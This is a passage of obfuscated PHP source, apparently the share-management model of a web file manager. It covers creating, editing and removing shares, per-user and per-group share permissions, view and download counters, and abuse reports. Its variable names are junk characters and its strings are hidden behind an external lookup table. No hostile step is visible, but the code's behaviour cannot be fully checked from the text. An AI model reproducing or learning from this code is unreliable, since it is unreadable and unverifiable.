$ÍƒÇÙ‰÷ ? $ÍƒÇÙ‰÷ : array(); } protected function getInfo($‚≥Â…Œä, $£Û»ÿ€≤ = false) { $ÌÌœﬁÓÿ =& $_SERVER[ëæªã÷]; if ($£Û»ÿ€≤) { return $this->_getShareInfo(array($ÌÌœﬁÓÿ[488] => $‚≥Â…Œä)); } $˙‡–Â„ = $this->cacheFunctionGet($ÌÌœﬁÓÿ[1877], $‚≥Â…Œä); return $˙‡–Â„; } public function getInfoByHash($à¬çùè÷) { return $this->_getShareInfo(array($_SERVER[ëæªã÷][490] => $à¬çùè÷)); } public function getInfoByPath($òËÁˆŸ®) { $ÌΩÎñÁ» =& $_SERVER[ëæªã÷]; $ÍÈ„ÓÅﬂ = array($ÌΩÎñÁ»[1628] => USER_ID, $ÌΩÎñÁ»[403] => $òËÁˆŸ®); return $this->_getShareInfo($ÍÈ„ÓÅﬂ); } public function getInfoBySourcePath($≠ô÷∑è™) { $òï€ùæÊ =& $_SERVER[ëæªã÷]; $∏âˆÓÃÓ = array($òï€ùæÊ[1628] => USER_ID, $òï€ùæÊ[1150] => $≠ô÷∑è™); return $this->_getShareInfo($∏âˆÓÃÓ); } private function _getShareInfo($‡ÙµØ∫ì) { $µ¨ñ‹µ∑ =& $_SERVER[ëæªã÷]; $óùÚ◊ì˙ = $this->where($‡ÙµØ∫ì)->find(); if (!$óùÚ◊ì˙) { return !1; } $‡ÙµØ∫ì = array($µ¨ñ‹µ∑[488] => $óùÚ◊ì˙[$µ¨ñ‹µ∑[488]]); $ﬂµÆ‹Üì = $µ¨ñ‹µ∑[1933]; $·‰ñÖΩË = Model($µ¨ñ‹µ∑[596])->order($µ¨ñ‹µ∑[401])->field($ﬂµÆ‹Üì)->where($‡ÙµØ∫ì)->select(); if ($óùÚ◊ì˙[$µ¨ñ‹µ∑[403]] == $µ¨ñ‹µ∑[200]) { $óùÚ◊ì˙[$µ¨ñ‹µ∑[97]] = IO::info($óùÚ◊ì˙[$µ¨ñ‹µ∑[1150]]); } else { $óùÚ◊ì˙[$µ¨ñ‹µ∑[97]] = Model($µ¨ñ‹µ∑[1301])->pathInfo($óùÚ◊ì˙[$µ¨ñ‹µ∑[403]]); } $óùÚ◊ì˙[$µ¨ñ‹µ∑[1934]] = $·‰ñÖΩË; return $óùÚ◊ì˙; } protected function getInfoAuth($ôÜ›çîΩ) { $ﬁ®„†‚˜ =& $_SERVER[ëæªã÷]; $ﬁ–‘¨ÏÏ = $this->getInfo($ôÜ›çîΩ); if ($ﬁ–‘¨ÏÏ[$ﬁ®„†‚˜[1628]] == USER_ID) { $ﬁ–‘¨ÏÏ[$ﬁ®„†‚˜[414]] = $ﬁ–‘¨ÏÏ[$ﬁ®„†‚˜[97]][$ﬁ®„†‚˜[414]]; } else { $ﬁ–‘¨ÏÏ[$ﬁ®„†‚˜[414]] = Model($ﬁ®„†‚˜[502])->authMake($ﬁ–‘¨ÏÏ[$ﬁ®„†‚˜[1934]]); } return $ﬁ–‘¨ÏÏ; } protected function listData($Ÿ‚˛◊Øè = null, $ÈàÑ‡·“ = 300) { $Âßı∞›ö =& $_SERVER[ëæªã÷]; $Íâ·¥£∏ = array(array($Âßı∞›ö[493] => array($Âßı∞›ö[988], 0), $Âßı∞›ö[495] => array($Âßı∞›ö[988], 0), $Âßı∞›ö[1935] => $Âßı∞›ö[1891])); if ($Ÿ‚˛◊Øè == $Âßı∞›ö[1936]) { $Íâ·¥£∏ = array($Âßı∞›ö[493] => 1); } else { if ($Ÿ‚˛◊Øè == $Âßı∞›ö[1135]) { $Íâ·¥£∏ = array($Âßı∞›ö[495] => 1); } } $Íâ·¥£∏[$Âßı∞›ö[1628]] = USER_ID; $ß«¯…ºŸ = $this->where($Íâ·¥£∏)->selectPage($ÈàÑ‡·“); return $ß«¯…ºŸ; } protected function listToMe($≤¬í¢Áç = 300) { $¬ıßÍ™´ =& $_SERVER[ëæªã÷]; $±˜ö¡‘ˆ = Model($¬ıßÍ™´[1937])->userGroupParents(USER_ID); $Êàúæ¶á = array($¬ıßÍ™´[580] => SourceModel::TYPE_USER, $¬ıßÍ™´[504] => USER_ID); if ($±˜ö¡‘ˆ) { $Êàúæ¶á = array(array($¬ıßÍ™´[580] => SourceModel::TYPE_USER, $¬ıßÍ™´[504] => USER_ID), array($¬ıßÍ™´[580] => SourceModel::TYPE_GROUP, $¬ıßÍ™´[504] => array($¬ıßÍ™´[7], $±˜ö¡‘ˆ)), $¬ıßÍ™´[1935] => $¬ıßÍ™´[1891]); } $„«≈¡‚π = Model($¬ıßÍ™´[596])->where($Êàúæ¶á)->selectPage($≤¬í¢Áç); $≥‘Ï†öÁ = array_to_keyvalue_group($„«≈¡‚π[$¬ıßÍ™´[373]], $¬ıßÍ™´[488]); if (!$≥‘Ï†öÁ) { return $„«≈¡‚π; } $‰’¨™Ω« = $¬ıßÍ™´[1938]; $Êàúæ¶á = array($¬ıßÍ™´[488] => array($¬ıßÍ™´[419], array_keys($≥‘Ï†öÁ)), $¬ıßÍ™´[1628] => array($¬ıßÍ™´[990], $¬ıßÍ™´[200])); $÷îìä®© = $this->field($‰’¨™Ω«)->where($Êàúæ¶á)->select(); foreach ($÷îìä®© as $≈Àê¯’º => &$´´˛ãÃ„) { $´´˛ãÃ„[$¬ıßÍ™´[1934]] = $≥‘Ï†öÁ[$´´˛ãÃ„[$¬ıßÍ™´[488]]]; } unset($´´˛ãÃ„); $Ç÷íøÒÄ = array($¬ıßÍ™´[1939] => $÷îìä®©, $¬ıßÍ™´[1940] => $„«≈¡‚π[$¬ıßÍ™´[370]]); return $Ç÷íøÒÄ; } protected function shareAdd($⁄óùí«¢, $®˚◊ªÎµ) { $ªõÍñΩÒ =& $_SERVER[ëæªã÷]; $¿ﬂŒ˜ß® = $this->_addShareData($⁄óùí«¢, $®˚◊ªÎµ); if (!empty($®˚◊ªÎµ[$ªõÍñΩÒ[1941]])) { $this->_shareAuthSet($¿ﬂŒ˜ß®, $®˚◊ªÎµ[$ªõÍñΩÒ[1941]]); } $this->shareEventAdd($⁄óùí«¢, $®˚◊ªÎµ, $ªõÍñΩÒ[1138]); return $¿ﬂŒ˜ß®; } protected function shareAddSystem($°Ωë∏˝´, $ãÁâ¸Ëò) { $ÿÆìÙ´µ =& $_SERVER[ëæªã÷]; $ŸÛÇ≠¢í = $this->_addShareData($°Ωë∏˝´, $ãÁâ¸Ëò, $ÿÆìÙ´µ[1250]); $this->_shareAuthSet($ŸÛÇ≠¢í, $ãÁâ¸Ëò[$ÿÆìÙ´µ[1941]]); return $ŸÛÇ≠¢í; } private function shareEventAdd($…òı’§¶, $å¸øòëø, $—ä†§¯· = "\141\144\144") { $¸Û€»üÒ =& $_SERVER[ëæªã÷]; if (!$…òı’§¶ || $…òı’§¶ == $¸Û€»üÒ[200]) { return; } if ($—ä†§¯· == $¸Û€»üÒ[1138]) { if ($å¸øòëø[$¸Û€»üÒ[493]] == $¸Û€»üÒ[99]) { Model($¸Û€»üÒ[564])->eventShare($…òı’§¶, $¸Û€»üÒ[1942]); } if ($å¸øòëø[$¸Û€»üÒ[495]] == $¸Û€»üÒ[99]) { Model($¸Û€»üÒ[564])->eventShare($…òı’§¶, $¸Û€»üÒ[1943]); } return; } $öÇ≠ó™† = $this->getInfoByPath($…òı’§¶); $ÚÜòΩ¯Î = $¸Û€»üÒ[1944]; if ($öÇ≠ó™†[$¸Û€»üÒ[493]] == $¸Û€»üÒ[200] && $å¸øòëø[$¸Û€»üÒ[493]] == $¸Û€»üÒ[99]) { $ÚÜòΩ¯Î = $¸Û€»üÒ[1942]; } if ($öÇ≠ó™†[$¸Û€»üÒ[493]] == $¸Û€»üÒ[99] && $å¸øòëø[$¸Û€»üÒ[493]] == $¸Û€»üÒ[200]) { $ÚÜòΩ¯Î = $¸Û€»üÒ[1945]; } if ($öÇ≠ó™†[$¸Û€»üÒ[495]] == $¸Û€»üÒ[200] && $å¸øòëø[$¸Û€»üÒ[495]] == $¸Û€»üÒ[99]) { $ÚÜòΩ¯Î = $¸Û€»üÒ[1943]; } if ($öÇ≠ó™†[$¸Û€»üÒ[495]] == $¸Û€»üÒ[99] && $å¸øòëø[$¸Û€»üÒ[495]] == $¸Û€»üÒ[200]) { $ÚÜòΩ¯Î = $¸Û€»üÒ[1946]; } Model($¸Û€»üÒ[564])->eventShare($…òı’§¶, $ÚÜòΩ¯Î); return; } private function _addShareData($Ë¸Ñ⁄⁄ä, $¬Ò∆Ω™§ = array(), $‰ï≥‡∂ò = false) { $ü°Õ€∂  =& $_SERVER[ëæªã÷]; $‰∞€ê¬† = $‰ï≥‡∂ò == $ü°Õ€∂ [1250] ? 0 : USER_ID; $ﬂ Ñ„ó≤ = array($ü°Õ€∂ [418] => $Ë¸Ñ⁄⁄ä, $ü°Õ€∂ [1619] => $‰∞€ê¬†); if ($Ë¸Ñ⁄⁄ä == 0) { $ﬂ Ñ„ó≤ = array($ü°Õ€∂ [1947] => $¬Ò∆Ω™§[$ü°Õ€∂ [1150]], $ü°Õ€∂ [1619] => $‰∞€ê¬†); } if ($∫åˆ¡≈Ë = $this->where($ﬂ Ñ„ó≤)->find()) { return $∫åˆ¡≈Ë[$ü°Õ€∂ [488]]; } if ($Ë¸Ñ⁄⁄ä == 0) { $Ü„Òº‹ = array($ü°Õ€∂ [32] => get_path_this($¬Ò∆Ω™§[$ü°Õ€∂ [88]])); } else { $Ü„Òº‹ = Model($ü°Õ€∂ [805])->sourceInfo($Ë¸Ñ⁄⁄ä); if (!$Ü„Òº‹) { return !1; } } if (!$¬Ò∆Ω™§[$ü°Õ€∂ [1528]]) { $¬Ò∆Ω™§[$ü°Õ€∂ [1528]] = $Ü„Òº‹[$ü°Õ€∂ [32]]; } $úà¢ÖÒ© = array($ü°Õ€∂ [1619] => $‰∞€ê¬†, $ü°Õ€∂ [418] => $Ë¸Ñ⁄⁄ä, $ü°Õ€∂ [1528] => $ü°Õ€∂ [12], $ü°Õ€∂ [493] => 0, $ü°Õ€∂ [495] => 0, $ü°Õ€∂ [1150] => $ü°Õ€∂ [12], $ü°Õ€∂ [311] => $ü°Õ€∂ [12], $ü°Õ€∂ [865] => $ü°Õ€∂ [12], $ü°Õ€∂ [1948] => 0, $ü°Õ€∂ [1949] => 0, $ü°Õ€∂ [496] => 0, $ü°Õ€∂ [497] => $ü°Õ€∂ [12], $ü°Õ€∂ [490] => $ü°Õ€∂ [12]); $ÊˆøôÓ˚ = explode($ü°Õ€∂ [50], $ü°Õ€∂ [1950]); foreach ($ÊˆøôÓ˚ as $◊ü≥ªëÿ) { if (!isset($¬Ò∆Ω™§[$◊ü≥ªëÿ])) { continue; } $úà¢ÖÒ©[$◊ü≥ªëÿ] = $¬Ò∆Ω™§[$◊ü≥ªëÿ]; } $ÿ∞≤§™œ = $this->add($úà¢ÖÒ©); $Öµ®ƒ‰ç = array($ü°Õ€∂ [490] => short_id($ÿ∞≤§™œ)); $this->where(array($ü°Õ€∂ [487] => $ÿ∞≤§™œ))->save($Öµ®ƒ‰ç); return $ÿ∞≤§™œ; } private function _shareAuthSet($ëíôìï±, $Å≠ò–Ï≠) { $πíúËÊ∆ =& $_SERVER[ëæªã÷]; if (!is_array($Å≠ò–Ï≠)) { return !1; } $Ûà¯Òïü = Model($πíúËÊ∆[1901]); $Ûà¯Òïü->where(array($πíúËÊ∆[488] => $ëíôìï±))->delete(); $íû“›á∫ = array(); foreach ($Å≠ò–Ï≠ as $°±£∞É») { $∏∆Ü¶“∆ = SourceModel::TYPE_USER; if ($°±£∞É»[$πíúËÊ∆[412]] == SourceModel::TYPE_GROUP) { $∏∆Ü¶“∆ = SourceModel::TYPE_GROUP; } $†Ëº∞≤¨ = array($πíúËÊ∆[488] => $ëíôìï±, $πíúËÊ∆[412] => $∏∆Ü¶“∆, $πíúËÊ∆[504] => intval($°±£∞É»[$πíúËÊ∆[504]]), $πíúËÊ∆[1897] => 0, $πíúËÊ∆[1951] => -1); if ($°±£∞É»[$πíúËÊ∆[1897]]) { $†Ëº∞≤¨[$πíúËÊ∆[1897]] = $°±£∞É»[$πíúËÊ∆[1897]]; } else { if ($°±£∞É»[$πíúËÊ∆[1951]]) { $†Ëº∞≤¨[$πíúËÊ∆[1951]] = $°±£∞É»[$πíúËÊ∆[1951]]; } } $íû“›á∫[] = $†Ëº∞≤¨; } return $Ûà¯Òïü->addAll($íû“›á∫, array(), !0); } public function numViewAdd($ﬂ—ÛˆôÌ) { $Ò§¨à≤© =& $_SERVER[ëæªã÷]; $≈‚úøœÂ = array($Ò§¨à≤©[487] => $ﬂ—ÛˆôÌ); $this->where($≈‚úøœÂ)->setAdd($Ò§¨à≤©[1948]); } public function numDownloadAdd($µ¶´Ë«ÿ) { $ÈŒìôË‘ =& $_SERVER[ëæªã÷]; $€à∑≥Û≠ = array($ÈŒìôË‘[487] => $µ¶´Ë«ÿ); $this->where($€à∑≥Û≠)->setAdd($ÈŒìôË‘[1949]); } protected function shareEdit($Ñ√âÙ†˙, $Öµ›Îóë) { $´æÕ‰úù =& $_SERVER[ëæªã÷]; $Ïì˘ÚØå = $this->getInfo($Ñ√âÙ†˙); if (!$Ïì˘ÚØå) { return !1; } $this->_checkLinkShare($Öµ›Îóë, $Ïì˘ÚØå); $·ª—∂Ä∞ = array(); $÷ˆ√õ¬© = explode($´æÕ‰úù[50], $´æÕ‰úù[1952]); foreach ($÷ˆ√õ¬© as $‰ÛŸü…œ) { if (!array_key_exists($‰ÛŸü…œ, $Öµ›Îóë)) { continue; } $·ª—∂Ä∞[$‰ÛŸü…œ] = $Öµ›Îóë[$‰ÛŸü…œ]; } $this->shareEventAdd($Ïì˘ÚØå[$´æÕ‰úù[403]], $Öµ›Îóë, $´æÕ‰úù[1766]); $this->where(array($´æÕ‰úù[487] => $Ñ√âÙ†˙))->save($·ª—∂Ä∞); if (isset($Öµ›Îóë[$´æÕ‰úù[1941]])) { $this->_shareAuthSet($Ñ√âÙ†˙, $Öµ›Îóë[$´æÕ‰úù[1941]]); } return !0; } private function _checkLinkShare($˜¬≈÷ó‘, $∂éÒüÙæ) { $ô∫ÆÓŒ∑ =& $_SERVER[ëæªã÷]; if ($˜¬≈÷ó‘[$ô∫ÆÓŒ∑[493]] != $ô∫ÆÓŒ∑[99]) { return; } $´ñ≤Ú€£ = $∂éÒüÙæ[$ô∫ÆÓŒ∑[97]][$ô∫ÆÓŒ∑[403]]; if ($∂éÒüÙæ[$ô∫ÆÓŒ∑[97]][$ô∫ÆÓŒ∑[33]] != $ô∫ÆÓŒ∑[202]) { $Ù†‘›≈ø = $this->_folderReport($´ñ≤Ú€£); if (!$Ù†‘›≈ø) { return; } show_json(LNG($ô∫ÆÓŒ∑[1953]) . $ô∫ÆÓŒ∑[1954] . $Ù†‘›≈ø, !1); } $è∏·Ö‹∂ = Model($ô∫ÆÓŒ∑[805])->fileInfoGet($∂éÒüÙæ[$ô∫ÆÓŒ∑[97]][$ô∫ÆÓŒ∑[403]]); if (!$è∏·Ö‹∂) { return; } $‡À›†´™ = $this->shareFileMeta($è∏·Ö‹∂[$ô∫ÆÓŒ∑[467]]); if (isset($‡À›†´™[$ô∫ÆÓŒ∑[378]]) && $‡À›†´™[$ô∫ÆÓŒ∑[378]] == $ô∫ÆÓŒ∑[99]) { show_json(LNG($ô∫ÆÓŒ∑[1955]), !1); } } private function _folderReport($úˆ°è·è) { $Òïåé∑ö =& $_SERVER[ëæªã÷]; $« ãﬂ≤ä = array($Òïåé∑ö[467] => array($Òïåé∑ö[988], 0), $Òïåé∑ö[730] => 3); $Âëõ∆›± = Model($Òïåé∑ö[1956])->where($« ãﬂ≤ä)->field($Òïåé∑ö[467])->select(); if (!$Âëõ∆›±) { return !1; } $Âëõ∆›± = array_to_keyvalue($Âëõ∆›±, $Òïåé∑ö[12], $Òïåé∑ö[467]); $Ÿ–≈∑˛° = $Òïåé∑ö[50] . $úˆ°è·è . $Òïåé∑ö[50]; $« ãﬂ≤ä = array($Òïåé∑ö[467] => array($Òïåé∑ö[7], $Âëõ∆›±), $Òïåé∑ö[521] => array($Òïåé∑ö[387], "\45{$Ÿ–≈∑˛°}\45"), $Òïåé∑ö[431] => 0); $µÊ±†¨ì = Model($Òïåé∑ö[805])->where($« ãﬂ≤ä)->field($Òïåé∑ö[1957])->find(); if (!$µÊ±†¨ì) { return !1; } $ùÁ¬ÿ™ö = substr($µÊ±†¨ì[$Òïåé∑ö[521]], strpos($µÊ±†¨ì[$Òïåé∑ö[521]], $Ÿ–≈∑˛°)); $« ãﬂ≤ä = array($Òïåé∑ö[403] => array($Òïåé∑ö[7], trim($ùÁ¬ÿ™ö, $Òïåé∑ö[50]))); $µŸì…◊Ö = Model($Òïåé∑ö[805])->where($« ãﬂ≤ä)->field($Òïåé∑ö[32])->select(); $ˆ¸˜Ò¡∫ = array_to_keyvalue($µŸì…◊Ö, $Òïåé∑ö[12], $Òïåé∑ö[32]); $ˆ¸˜Ò¡∫[] = $µÊ±†¨ì[$Òïåé∑ö[32]]; return implode($Òïåé∑ö[8], $ˆ¸˜Ò¡∫); } protected function remove($¸í”¢î«) { $¢ çº⁄≤ =& $_SERVER[ëæªã÷]; if (is_array($¸í”¢î«)) { $¸í”¢î« = array($¢ çº⁄≤[7], $¸í”¢î«); } $ÙØŸ‰∆Û = array($¢ çº⁄≤[488] => $¸í”¢î«); $‹§åŸ»¯ = $this->where($ÙØŸ‰∆Û)->delete(); if ($‹§åŸ»¯) { Model($¢ çº⁄≤[596])->where(array($¢ çº⁄≤[488] => $¸í”¢î«))->delete(); } $÷ò˚˘îΩ = is_array($¸í”¢î«) ? $¸í”¢î«[1] : array($¸í”¢î«); for ($€Õ©Ã·¥ = 0; $€Õ©Ã·¥ < count($÷ò˚˘îΩ); $€Õ©Ã·¥++) { $ À∂‡·» = $this->getInfo($÷ò˚˘îΩ[$€Õ©Ã·¥]); if ($ À∂‡·»[$¢ çº⁄≤[495]] == $¢ çº⁄≤[99]) { Model($¢ çº⁄≤[564])->eventShare($ À∂‡·»[$¢ çº⁄≤[403]], $¢ çº⁄≤[1946]); } if ($ À∂‡·»[$¢ çº⁄≤[493]] == $¢ çº⁄≤[99]) { Model($¢ çº⁄≤[564])->eventShare($ À∂‡·»[$¢ çº⁄≤[403]], $¢ çº⁄≤[1945]); } } return $‹§åŸ»¯; } protected function removeBySource($´Ñ‰ “™) { $ﬁ˜¢Ç±Í =& $_SERVER[ëæªã÷]; $¯ﬂ¸‚…∫ = array($ﬁ˜¢Ç±Í[418] => array($ﬁ˜¢Ç±Í[419], $´Ñ‰ “™)); $£ÃÔüÖ = $this->field($ﬁ˜¢Ç±Í[488])->where($¯ﬂ¸‚…∫)->select(); $£ÃÔüÖ = array_to_keyvalue($£ÃÔüÖ, $ﬁ˜¢Ç±Í[12], $ﬁ˜¢Ç±Í[488]); if (!$£ÃÔüÖ) { return; } $¯ﬂ¸‚…∫ = array($ﬁ˜¢Ç±Í[487] => array($ﬁ˜¢Ç±Í[419], $£ÃÔüÖ)); $this->where($¯ﬂ¸‚…∫)->delete(); Model($ﬁ˜¢Ç±Í[596])->where($¯ﬂ¸‚…∫)->delete(); } public function listAll($¶¥Ã¡í˛) { $Ÿ˘Î∞èÆ =& $_SERVER[ëæªã÷]; $€ä—˝ª· = array(); if ($¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[1628]]) { $€ä—˝ª·[$Ÿ˘Î∞èÆ[1628]] = $¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[1628]]; } if ($¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[741]]) { $„¥›ÁΩ° = $¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[496]] ? $¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[496]] : strtotime(date($Ÿ˘Î∞èÆ[1958])); $€ä—˝ª·[$Ÿ˘Î∞èÆ[203]] = array($Ÿ˘Î∞èÆ[337], array($¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[741]], $„¥›ÁΩ°)); } if ($¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[33]]) { $€ä—˝ª·[$¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[33]]] = 1; } else { $€ä—˝ª·[] = array($Ÿ˘Î∞èÆ[493] => array($Ÿ˘Î∞èÆ[988], 0), $Ÿ˘Î∞èÆ[495] => array($Ÿ˘Î∞èÆ[988], 0), $Ÿ˘Î∞èÆ[1935] => $Ÿ˘Î∞èÆ[1891]); } if ($¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[1887]]) { $€ä—˝ª·[] = array($Ÿ˘Î∞èÆ[490] => $¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[1887]], $Ÿ˘Î∞èÆ[1528] => array($Ÿ˘Î∞èÆ[387], "\45{$¶¥Ã¡í˛[$Ÿ˘Î∞èÆ[1887]]}\45"), $Ÿ˘Î∞èÆ[1935] => $Ÿ˘Î∞èÆ[1891]); } $œÒãªªÊ = $this->_makeOrder()->where($€ä—˝ª·)->selectPage(20); if (empty($œÒãªªÊ[$Ÿ˘Î∞èÆ[373]])) { return array(); } $this->_listDataApply($œÒãªªÊ[$Ÿ˘Î∞èÆ[373]]); return $œÒãªªÊ; } public function listDataApply($âı©äﬂˆ) { $this->_listDataApply($âı©äﬂˆ); return $âı©äﬂˆ; } private function _listDataApply(&$ï©˚ƒÕ⁄) { $€ﬂıàÜË =& $_SERVER[ëæªã÷]; $Ì´¢±Ø≤ = array_to_keyvalue($ï©˚ƒÕ⁄, $€ﬂıàÜË[12], $€ﬂıàÜË[1628]); $äå„ûÏô = Model($€ﬂıàÜË[538])->userListInfo(array_unique($Ì´¢±Ø≤)); $›ÅÛÀ˚ˆ = array_to_keyvalue($ï©˚ƒÕ⁄, $€ﬂıàÜË[12], $€ﬂıàÜË[403]); $«Ü◊¿÷ù = Model($€ﬂıàÜË[805])->sourceListInfo($›ÅÛÀ˚ˆ, !0); foreach ($ï©˚ƒÕ⁄ as $ÁüœÇ–Æ => &$∏–¡Â©¿) { $››’Îπ¶ = $∏–¡Â©¿[$€ﬂıàÜË[1628]]; $∏–¡Â©¿[$€ﬂıàÜË[1959]] = $äå„ûÏô[$››’Îπ¶] ? $äå„ûÏô[$››’Îπ¶] : !1; $Í°Êì≠Â = $∏–¡Â©¿[$€ﬂıàÜË[403]]; $∏–¡Â©¿[$€ﬂıàÜË[97]] = $«Ü◊¿÷ù[$Í°Êì≠Â] ? $«Ü◊¿÷ù[$Í°Êì≠Â] : !1; if ($∏–¡Â©¿[$€ﬂıàÜË[97]][$€ﬂıàÜË[431]] == $€ﬂıàÜË[99]) { unset($ï©˚ƒÕ⁄[$ÁüœÇ–Æ]); } if ($∏–¡Â©¿[$€ﬂıàÜË[97]] != $€ﬂıàÜË[200] && !$∏–¡Â©¿[$€ﬂıàÜË[97]]) { unset($ï©˚ƒÕ⁄[$ÁüœÇ–Æ]); } } unset($∏–¡Â©¿); $ï©˚ƒÕ⁄ = array_values($ï©˚ƒÕ⁄); } private function _makeOrder($ﬂ˘êî°é = '') { $•ÜãÖ¨≈ =& $_SERVER[ëæªã÷]; $√Œœ£¯Õ = array($•ÜãÖ¨≈[203], $•ÜãÖ¨≈[496], $•ÜãÖ¨≈[1948], $•ÜãÖ¨≈[1949]); $Õ Á¨±û = array($•ÜãÖ¨≈[448] => $•ÜãÖ¨≈[449], $•ÜãÖ¨≈[450] => $•ÜãÖ¨≈[451]); $É‚—Ôã± = Input::get($•ÜãÖ¨≈[455], $•ÜãÖ¨≈[7], $•ÜãÖ¨≈[424], $√Œœ£¯Õ); $⁄éıÀìÚ = Input::get($•ÜãÖ¨≈[456], $•ÜãÖ¨≈[7], $•ÜãÖ¨≈[1960], array($•ÜãÖ¨≈[1886], $•ÜãÖ¨≈[450])); $⁄éıÀìÚ = $Õ Á¨±û[$⁄éıÀìÚ]; $ﬂ˘êî°é = $ﬂ˘êî°é . "{$É‚—Ôã±}\40{$⁄éıÀìÚ}"; return $this->order($ﬂ˘êî°é); } public function reportAdd($¡˚ñ™∆∞) { $•†‹ãÕ… =& $_SERVER[ëæªã÷]; $¥Öô∫øˆ = array($•†‹ãÕ…[488] => $¡˚ñ™∆∞[$•†‹ãÕ…[488]], $•†‹ãÕ…[1628] => USER_ID); if (Model($•†‹ãÕ…[1956])->where($¥Öô∫øˆ)->find()) { return !1; } $Ÿ¡¶Ö—÷ = array($•†‹ãÕ…[488] => $¡˚ñ™∆∞[$•†‹ãÕ…[488]], $•†‹ãÕ…[1528] => $¡˚ñ™∆∞[$•†‹ãÕ…[1528]], $•†‹ãÕ…[403] => $¡˚ñ™∆∞[$•†‹ãÕ…[403]], $•†‹ãÕ…[467] => $¡˚ñ™∆∞[$•†‹ãÕ…[467]], $•†‹ãÕ…[1628] => USER_ID, $•†‹ãÕ…[33] => $¡˚ñ™∆∞[$•†‹ãÕ…[33]], $•†‹ãÕ…[451] => $¡˚ñ™∆∞[$•†‹ãÕ…[451]]); return Model($•†‹ãÕ…[1956])->add($Ÿ¡¶Ö—÷); } public function reportList($ÆÇÜÉè) { $ƒÙ¸ä˝Á =& $_SERVER[ëæªã÷]; $∑á∞ñ¶≥ = array(); if ($ÆÇÜÉè[$ƒÙ¸ä˝Á[741]]) { $±ƒ‰æ∫ì = $ÆÇÜÉè[$ƒÙ¸ä˝Á[496]] ? $ÆÇÜÉè[$ƒÙ¸ä˝Á[496]] : strtotime(date($ƒÙ¸ä˝Á[1958])); $∑á∞ñ¶≥[$ƒÙ¸ä˝Á[203]] = array($ƒÙ¸ä˝Á[337], array($ÆÇÜÉè[$ƒÙ¸ä˝Á[741]], $±ƒ‰æ∫ì)); } if (isset($ÆÇÜÉè[$ƒÙ¸ä˝Á[33]]) && in_array($ÆÇÜÉè[$ƒÙ¸ä˝Á[33]], array($ƒÙ¸ä˝Á[99], $ƒÙ¸ä˝Á[435], $ƒÙ¸ä˝Á[1961], $ƒÙ¸ä˝Á[1962], $ƒÙ¸ä˝Á[1963]))) { $∑á∞ñ¶≥[$ƒÙ¸ä˝Á[33]] = $ÆÇÜÉè[$ƒÙ¸ä˝Á[33]]; } if (isset($ÆÇÜÉè[$ƒÙ¸ä˝Á[730]]) && in_array($ÆÇÜÉè[$ƒÙ¸ä˝Á[730]], array($ƒÙ¸ä˝Á[200], $ƒÙ¸ä˝Á[99], $ƒÙ¸ä˝Á[435], $ƒÙ¸ä˝Á[1961]))) { $∑á∞ñ¶≥[$ƒÙ¸ä˝Á[730]] = $ÆÇÜÉè[$ƒÙ¸ä˝Á[730]]; } $…ÁÉµòΩ = Input::get($ƒÙ¸ä˝Á[456], $ƒÙ¸ä˝Á[7], $ƒÙ¸ä˝Á[1960], array($ƒÙ¸ä˝Á[1886], $ƒÙ¸ä˝Á[450])); $Ì∆â—˝¡ = array($ƒÙ¸ä˝Á[448] => $ƒÙ¸ä˝Á[449], $ƒÙ¸ä˝Á[450] => $ƒÙ¸ä˝Á[451]); $˛ÚË”Ê€ = $ƒÙ¸ä˝Á[1964] . $Ì∆â—˝¡[$…ÁÉµòΩ]; $°ıŒ§ﬂ‰ = Model($ƒÙ¸ä˝Á[1956])->where($∑á∞ñ¶≥)->order($˛ÚË”Ê€)->selectPage(20); if (empty($°ıŒ§ﬂ‰[$ƒÙ¸ä˝Á[373]])) { return array(); } $”◊˜◊£ı = array_to_keyvalue_group($°ıŒ§ﬂ‰[$ƒÙ¸ä˝Á[373]], $ƒÙ¸ä˝Á[730], $ƒÙ¸ä˝Á[488]); if (!empty($”◊˜◊£ı[0])) { $ÆÇÜÉè = $”◊˜◊£ı[0]; $∑á∞ñ¶≥ = array($ƒÙ¸ä˝Á[488] => array($ƒÙ¸ä˝Á[7], $ÆÇÜÉè)); $ùïñè∞Ì = $this->where($∑á∞ñ¶≥)->field($ƒÙ¸ä˝Á[488])->select(); $ùïñè∞Ì = array_to_keyvalue($ùïñè∞Ì, $ƒÙ¸ä˝Á[12], $ƒÙ¸ä˝Á[488]); $…ãßø≈È = array_diff($ÆÇÜÉè, $ùïñè∞Ì); if (!empty($…ãßø≈È)) { foreach ($°ıŒ§ﬂ‰[$ƒÙ¸ä˝Á[373]] as $Ω©ï’µ” => $≠∫ßÀ∆å) { if (in_array($≠∫ßÀ∆å[$ƒÙ¸ä˝Á[488]], $…ãßø≈È)) { unset($°ıŒ§ﬂ‰[$ƒÙ¸ä˝Á[373]][$Ω©ï’µ”]); } } } } $this->_listDataApply($°ıŒ§ﬂ‰[$ƒÙ¸ä˝Á[373]]); return $°ıŒ§ﬂ‰; } public function reportStatus($©ñîƒ¡º) { $Ó¡È›£ =& $_SERVER[ëæªã÷]; $´Ö≠°–Ç = array($Ó¡È›£[401] => $©ñîƒ¡º[$Ó¡È›£[401]]); $êÀàπÓó = Model($Ó¡È›£[1956])->where($´Ö≠°–Ç)->field($Ó¡È›£[1965])->find(); if (!$êÀàπÓó) { return !1; } $íîçÃª» = array($Ó¡È›£[730] => $©ñîƒ¡º[$Ó¡È›£[730]]); if ($©ñîƒ¡º[$Ó¡È›£[730]] == $Ó¡È›£[1961] && $êÀàπÓó[$Ó¡È›£[730]] == $Ó¡È›£[1961]) { $íîçÃª»[$Ó¡È›£[730]] = 0; } $ƒÇ™ïÃ  = Model($Ó¡È›£[1956])->where($´Ö≠°–Ç)->save($íîçÃª»); if ($©ñîƒ¡º[$Ó¡È›£[730]] == $Ó¡È›£[435]) { if ($êÀàπÓó[$Ó¡È›£[467]] != $Ó¡È›£[200] && $this->shareFileMeta($êÀàπÓó[$Ó¡È›£[467]])) { $this->shareFileMeta($êÀàπÓó[$Ó¡È›£[467]], 0); } $this->remove($êÀàπÓó[$Ó¡È›£[488]]); return !0; } if 